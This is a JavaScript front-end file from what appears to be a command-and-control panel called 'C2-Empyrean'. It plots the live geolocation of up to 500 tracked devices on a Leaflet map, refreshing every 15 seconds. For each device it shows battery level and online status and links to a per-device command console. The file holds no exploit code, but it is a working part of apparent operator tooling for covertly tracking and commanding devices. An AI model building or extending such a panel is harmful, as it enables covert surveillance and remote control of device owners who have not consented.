/**
 * C2-Empyrean - Map View Scripts
 * Leaflet-based real-time geolocation tracking
 */

let map = null;
let markers = [];
let refreshInterval = null;

document.addEventListener('DOMContentLoaded', function() {
    initMap();
    loadDeviceMarkers();
    refreshInterval = setInterval(loadDeviceMarkers, 15000);
});

function initMap() {
    map = L.map('map', {
        center: [20, 0],
        zoom: 2,
        zoomControl: true,
        attributionControl: false
    });

    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19
    }).addTo(map);

    // Add scale control
    L.control.scale({ position: 'bottomleft', imperial: false }).addTo(map);
}

async function loadDeviceMarkers() {
    try {
        const result = await API.get('/devices/list?page=1&per_page=500&has_location=1');
        if (!result || !result.success) {
            if (result && result.code === 401) { window.location.href = '/admin/login'; return; }
            return;
        }

        const devices = result.data.devices || [];
        clearMarkers();

        let onlineCount = 0;
        let bounds = [];

        devices.forEach(d => {
            const loc = d.last_location;
            if (!loc || !loc.lat || !loc.lng) return;
            if (d.is_online) onlineCount++;

            const color = d.is_online ? '#34c759' : '#ff453a';
            const icon = L.divIcon({
                html: `<div style="width:14px;height:14px;background:${color};border:3px solid rgba(255,255,255,0.2);border-radius:50%;box-shadow:0 0 12px ${color}80;"></div>`,
                iconSize: [14, 14],
                iconAnchor: [7, 7],
                className: ''
            });

            const marker = L.marker([loc.lat, loc.lng], { icon }).addTo(map);
            marker.bindPopup(`
                <div style="font-size:13px;min-width:200px;">
                    <div style="font-family:monospace;color:#7b2ff7;font-weight:600;">${escapeHtml(d.device_id)}</div>
                    <div style="color:rgba(0,0,0,0.6);font-size:12px;margin-top:4px;">${escapeHtml(d.model || '—')} · ${d.is_online ? '🟢 Online' : '🔴 Offline'}</div>
                    <div style="color:rgba(0,0,0,0.6);font-size:12px;">🔋 ${d.battery_level || '?'}% · ${timeAgo(d.last_seen)}</div>
                    <div style="margin-top:8px;display:flex;gap:6px;">
                        <a href="/admin/device_detail?id=${d.device_id}" style="padding:4px 10px;font-size:11px;border-radius:4px;background:#7b2ff7;color:#fff;text-decoration:none;">Details</a>
                        <a href="/admin/command_console?device=${d.device_id}" style="padding:4px 10px;font-size:11px;border-radius:4px;background:#00d4ff;color:#fff;text-decoration:none;">Console</a>
                    </div>
                </div>
            `);
            markers.push(marker);
            bounds.push([loc.lat, loc.lng]);
        });

        // Update overlay stats
        setText('statTotal', devices.length);
        setText('statOnline', onlineCount);
        setText('statUpdated', new Date().toLocaleTimeString());

        // Fit bounds if we have markers
        if (bounds.length > 0 && document.getElementById('fitToggle')?.checked) {
            map.fitBounds(bounds, { padding: [50, 50] });
        }

    } catch (err) {
        console.error('Map error:', err);
    }
}

function clearMarkers() {
    markers.forEach(m => map.removeLayer(m));
    markers = [];
}

function fitAllMarkers() {
    if (markers.length === 0) return;
    const group = L.featureGroup(markers);
    map.fitBounds(group.getBounds().pad(0.1));
}

function refreshMarkers() {
    loadDeviceMarkers();
}

function setText(id, val) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
}
